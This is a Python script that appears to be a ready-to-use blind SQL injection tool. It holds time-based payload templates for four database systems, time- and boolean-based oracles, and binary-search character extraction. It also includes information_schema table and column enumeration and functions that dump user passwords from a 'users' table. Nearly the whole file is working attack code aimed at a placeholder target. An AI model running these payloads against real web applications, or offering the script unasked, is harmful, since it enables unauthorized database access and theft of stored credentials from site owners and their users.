#!/usr/bin/env python3
"""SQL injection: time-based and boolean-based blind oracles, generic
binary-search extraction (dump_value), information_schema enumeration, and
a simple time-based character-equality probe.

Switch DBMS by changing the DB constant below. Payload templates take a
{cond} (a SQL condition) and {delay} (seconds)."""

import string
import time
import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
SESSION = requests.Session()

DELAY = 5
DB = "mysql"

TIME_PAYLOADS = {
    "mysql": "1' AND IF(({cond}),SLEEP({delay}),0)-- -",
    "mssql": "1'; IF ({cond}) WAITFOR DELAY '0:0:{delay}'-- -",
    "postgres": "1'; SELECT CASE WHEN ({cond}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- -",
    "oracle": "1' AND (SELECT CASE WHEN ({cond}) THEN dbms_lock.sleep({delay}) ELSE NULL END FROM dual) IS NULL-- -",
}

TRUE_MARKER = "Welcome back"


def is_true_time_based(condition_sql: str, delay: int = DELAY) -> bool:
    """Returns True if the injected condition is true, measured by response delay."""
    payload = TIME_PAYLOADS[DB].format(cond=condition_sql, delay=delay)
    params = {"id": payload}
    start = time.time()
    SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=delay + 10)
    elapsed = time.time() - start
    return elapsed >= delay


def is_true_boolean_based(condition_sql: str) -> bool:
    """Returns True if the injected condition is true, detected by a content marker."""
    payload = f"1' AND ({condition_sql})-- -"
    params = {"id": payload}
    r = SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=10)
    return TRUE_MARKER in r.text


def extract_char_equality(select_query: str, pos: int, delay: int = DELAY,
                          charset: str = string.printable) -> str:
    """Recover a single character at position `pos` by brute-forcing each
    candidate with a direct time-based equality probe, e.g.:

        %' AND IF((SELECT SUBSTRING(password,1,1) FROM Users LIMIT 1)='a',SLEEP(5),0)-- -

    Simpler but slower than dump_value's binary search (one request per
    candidate instead of ~7 per character). Returns "" if no candidate matches."""
    for ch in charset:
        cond = f"(SELECT SUBSTRING(({select_query}),{pos},1))='{ch}'"
        payload = TIME_PAYLOADS[DB].format(cond=cond, delay=delay)
        params = {"id": payload}
        start = time.time()
        SESSION.get(f"{BASE_URL}/product", params=params, verify=False, timeout=delay + 10)
        if time.time() - start >= delay:
            print(f"[+] pos {pos}: {ch}")
            return ch
    return ""


def dump_value(select_query: str, oracle, max_len: int = 64) -> str:
    """Extract a single scalar value character by character using binary search
    over the ASCII range. 'oracle' is a callable taking a SQL condition and
    returning a bool (use is_true_time_based or is_true_boolean_based)."""
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({select_query}),{pos},1))>{mid}"
            if oracle(cond):
                low = mid + 1
            else:
                high = mid - 1
        cond_eq = f"ASCII(SUBSTRING(({select_query}),{pos},1))={low}"
        if not oracle(cond_eq):
            break
        result += chr(low)
        print(f"[+] {result}")
    return result


def extract_password_time_based(user_id: int = 1) -> str:
    return dump_value(f"SELECT password FROM users WHERE id={user_id}", is_true_time_based)


def extract_password_boolean_based(user_id: int = 1) -> str:
    return dump_value(f"SELECT password FROM users WHERE id={user_id}", is_true_boolean_based)


def enumerate_tables(oracle, db_name: str = "database()", max_tables: int = 20) -> list[str]:
    """Enumerate table names of the current database via information_schema."""
    tables = []
    for i in range(max_tables):
        table = dump_value(
            f"SELECT table_name FROM information_schema.tables "
            f"WHERE table_schema={db_name} LIMIT 1 OFFSET {i}",
            oracle,
        )
        if not table:
            break
        tables.append(table)
        print(f"[*] Table: {table}")
    return tables


def enumerate_columns(oracle, table: str, db_name: str = "database()", max_cols: int = 30) -> list[str]:
    """Enumerate column names of a given table via information_schema."""
    columns = []
    for i in range(max_cols):
        col = dump_value(
            f"SELECT column_name FROM information_schema.columns "
            f"WHERE table_schema={db_name} AND table_name='{table}' LIMIT 1 OFFSET {i}",
            oracle,
        )
        if not col:
            break
        columns.append(col)
        print(f"[*] Column: {table}.{col}")
    return columns


if __name__ == "__main__":
    pass
